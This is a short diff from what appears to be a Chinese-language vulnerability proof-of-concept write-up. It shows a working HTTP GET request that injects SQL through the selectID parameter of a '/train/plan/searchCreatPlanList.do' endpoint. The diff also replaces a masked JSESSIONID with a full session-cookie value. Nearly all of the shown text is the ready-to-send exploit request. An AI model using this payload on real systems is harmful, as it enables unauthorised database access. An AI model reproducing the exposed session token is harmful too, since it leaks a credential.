@@ -89,7 +89,7 @@ POC/EXP：携带cookie访问
 ```http
 GET /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+ HTTP/1.1
 Host: 127.0.0.1
-Cookie: JSESSIONID=5******************************6
+Cookie: JSESSIONID=555A25C7E278A92CE7AC9E8FE0F9E916
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
 ```
